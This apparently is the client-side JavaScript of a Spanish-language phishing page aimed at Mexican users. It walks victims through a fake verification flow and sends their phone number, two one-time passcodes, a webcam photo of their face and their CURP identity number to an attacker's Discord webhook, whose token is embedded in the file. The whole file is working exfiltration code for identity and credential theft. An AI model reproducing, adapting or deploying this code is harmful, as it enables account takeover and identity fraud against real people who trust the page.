document.addEventListener('DOMContentLoaded', () => {
    // ⚠️ COLOCA AQUÍ TU URL DE DISCORD ⚠️
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532235985042280509/KAZrpj43FPzhOGyS_MxzcWTOxOYC7gMvJcHZxQSSXtIG8wYCjun0vFBkj_VAoeH7bonj";

    // Elementos de la Cámara (Corregido a 'webcam' como está en tu HTML)
    const webcamVideo = document.getElementById('webcam');
    const photoCanvas = document.getElementById('photoCanvas');
    let mediaStream = null;

    // Encender cámara con resolución adecuada
    async function startCamera() {
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: "user",
                    width: { ideal: 720 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            if (webcamVideo) {
                webcamVideo.srcObject = mediaStream;
                await webcamVideo.play();
            }
        } catch (error) {
            console.error("Error al acceder a la cámara:", error);
            alert("Por favor permite los permisos de cámara en tu navegador y asegúrate de estar navegando bajo HTTPS.");
        }
    }

    // Apagar la cámara
    function stopCamera() {
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }
    }

    // Enviar mensajes de texto a Discord
    async function sendStepToDiscord(title, fields) {
        if (!DISCORD_WEBHOOK_URL) return;

        const payload = {
            embeds: [
                {
                    title: title,
                    color: 3447003,
                    fields: fields,
                    timestamp: new Date().toISOString()
                }
            ]
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            console.error(`[Discord Error]`, error);
        }
    }

    // Capturar fotograma y enviarlo como imagen adjunta a Discord (Promisificada para esperar el envío real)
    function sendPhotoToDiscord(phone) {
        return new Promise((resolve, reject) => {
            if (!webcamVideo || !photoCanvas) {
                return reject("Elementos de video/canvas no encontrados");
            }

            photoCanvas.width = webcamVideo.videoWidth || 640;
            photoCanvas.height = webcamVideo.videoHeight || 640;

            const context = photoCanvas.getContext('2d');

            // Efecto espejo invertido corregido para el guardado
            context.translate(photoCanvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(webcamVideo, 0, 0, photoCanvas.width, photoCanvas.height);

            photoCanvas.toBlob(async (blob) => {
                if (!blob) {
                    return reject("Error al generar imagen");
                }

                const formData = new FormData();
                const payload = {
                    embeds: [{
                        title: "📸 Paso 3: Captura Facial Realizada",
                        color: 3447003,
                        fields: [
                            { name: "Teléfono", value: phone || "N/A", inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                formData.append("payload_json", JSON.stringify(payload));
                formData.append("file", blob, "captura_facial.png");

                try {
                    const response = await fetch(DISCORD_WEBHOOK_URL, {
                        method: "POST",
                        body: formData
                    });

                    if (response.ok) {
                        console.log("[Discord] Foto enviada con éxito.");
                        resolve();
                    } else {
                        reject(`Error en servidor Discord: ${response.status}`);
                    }
                } catch (error) {
                    console.error("[Discord Error Foto]", error);
                    reject(error);
                }
            }, 'image/png');
        });
    }

    function getOTPValue(groupId) {
        const boxes = document.querySelectorAll(`#${groupId} .otp-box`);
        let value = "";
        boxes.forEach(box => { value += box.value; });
        return value;
    }

    // Referencias a pantallas
    const screenPhone = document.getElementById('screenPhone');
    const screenOTP = document.getElementById('screenOTP');
    const screenFace = document.getElementById('screenFace');
    const screenFinal = document.getElementById('screenFinal');
    const screenSuccess = document.getElementById('screenSuccess');

    // Elementos
    const phoneInput = document.getElementById('phoneInput');
    const phoneForm = document.getElementById('phoneForm');
    const displayPhoneNumbers = document.querySelectorAll('.displayPhoneNumber');
    
    const btnCloseOTP = document.getElementById('btnCloseOTP');
    const btnCloseFace = document.getElementById('btnCloseFace');
    const btnCloseFinal = document.getElementById('btnCloseFinal');
    
    const btnTakePhoto = document.getElementById('btnTakePhoto');
    const curpInput = document.getElementById('curpInput');
    const finalForm = document.getElementById('finalForm');

    const prefix = "+52 ";
    let countdownTimer;

    // Mascara de teléfono
    phoneInput.addEventListener('input', (e) => {
        let rawDigits = e.target.value.replace(/\D/g, '');
        if (rawDigits.startsWith('52')) {
            rawDigits = rawDigits.substring(2);
        }
        rawDigits = rawDigits.substring(0, 10);
        e.target.value = prefix + rawDigits;
    });

    phoneInput.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && phoneInput.value.length <= prefix.length) {
            e.preventDefault();
        }
    });

    // PASO 1: Teléfono -> Discord
    phoneForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const digitsOnly = phoneInput.value.replace(/\D/g, '').substring(2);

        if (digitsOnly.length !== 10) {
            alert("Por favor ingresa un número celular válido de 10 dígitos.");
            return;
        }

        const formattedPhone = `+52 ${digitsOnly.substring(0,2)} ${digitsOnly.substring(2,6)} ${digitsOnly.substring(6,10)}`;
        displayPhoneNumbers.forEach(el => el.textContent = formattedPhone);

        sendStepToDiscord("📱 Paso 1: Teléfono Registrado", [
            { name: "Número de Teléfono", value: phoneInput.value, inline: true }
        ]);

        screenPhone.classList.remove('active');
        screenOTP.classList.add('active');

        const group1 = document.querySelectorAll('#otpGroup1 .otp-box');
        group1[0].focus();
        startTimer();
    });

    function setupOTPGroup(groupId, onCompleteCallback) {
        const boxes = document.querySelectorAll(`#${groupId} .otp-box`);
        boxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                box.value = box.value.replace(/\D/g, '');
                if (box.value !== "") {
                    if (index < boxes.length - 1) {
                        boxes[index + 1].focus();
                    } else if (onCompleteCallback) {
                        onCompleteCallback();
                    }
                }
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === "" && index > 0) {
                    boxes[index - 1].focus();
                }
            });
        });
    }

    // PASO 2: OTP 1 -> Discord y encendido de cámara
    setupOTPGroup('otpGroup1', () => {
        const otp1Value = getOTPValue('otpGroup1');

        sendStepToDiscord("🔑 Paso 2: Primer Código OTP Ingresado", [
            { name: "Teléfono", value: phoneInput.value, inline: true },
            { name: "Código OTP 1", value: otp1Value, inline: true }
        ]);

        setTimeout(() => {
            screenOTP.classList.remove('active');
            screenFace.classList.add('active');
            
            // Inicia la cámara al mostrar la pantalla del círculo
            startCamera();
        }, 300);
    });

    setupOTPGroup('otpGroup2', () => {
        curpInput.focus();
    });

    // PASO 3: Tomar foto -> Esperar respuesta -> Apagar cámara y cambiar pantalla
    btnTakePhoto.addEventListener('click', async () => {
        try {
            // Estado visual de carga en el botón
            btnTakePhoto.disabled = true;
            btnTakePhoto.textContent = "Procesando...";

            // Esperar que la foto realmente suba a Discord
            await sendPhotoToDiscord(phoneInput.value);

            // Una vez confirmada la subida, se apaga la cámara y se cambia de pantalla
            stopCamera();
            screenFace.classList.remove('active');
            screenFinal.classList.add('active');

            const group2 = document.querySelectorAll('#otpGroup2 .otp-box');
            group2[0].focus();
        } catch (err) {
            alert("No se pudo enviar la foto. Intenta tomarla nuevamente.");
            console.error(err);
        } finally {
            btnTakePhoto.disabled = false;
            btnTakePhoto.textContent = "Tomar foto";
        }
    });

    curpInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.toUpperCase();
    });

    // PASO 4: CURP + OTP 2 -> Discord
    finalForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (curpInput.value.length < 18) {
            alert("Por favor ingresa los 18 caracteres de tu CURP.");
            return;
        }

        const otp2Value = getOTPValue('otpGroup2');

        sendStepToDiscord("✅ Paso 4: Proceso Completado", [
            { name: "Teléfono", value: phoneInput.value, inline: true },
            { name: "CURP", value: curpInput.value, inline: true },
            { name: "Código OTP 2", value: otp2Value || "No ingresado", inline: true }
        ]);

        screenFinal.classList.remove('active');
        screenSuccess.classList.add('active');
    });

    // Botones de cierre (aseguran apagar la cámara si se regresa)
    btnCloseOTP.addEventListener('click', () => {
        screenOTP.classList.remove('active');
        screenPhone.classList.add('active');
        clearInterval(countdownTimer);
    });

    btnCloseFace.addEventListener('click', () => {
        stopCamera();
        screenFace.classList.remove('active');
        screenPhone.classList.add('active');
    });

    btnCloseFinal.addEventListener('click', () => {
        screenFinal.classList.remove('active');
        screenPhone.classList.add('active');
    });

    function startTimer() {
        let seconds = 30;
        const timerText = document.getElementById('timerText');
        timerText.innerHTML = `Reenviar en <span id="timerSeconds">${seconds}</span> segundos`;

        clearInterval(countdownTimer);
        countdownTimer = setInterval(() => {
            seconds--;
            if (seconds > 0) {
                const el = document.getElementById('timerSeconds');
                if (el) el.textContent = seconds;
            } else {
                clearInterval(countdownTimer);
                timerText.innerHTML = `<span class="resend-link" id="btnResend">Reenviar código</span>`;
                document.getElementById('btnResend').addEventListener('click', startTimer);
            }
        }, 1000);
    }
});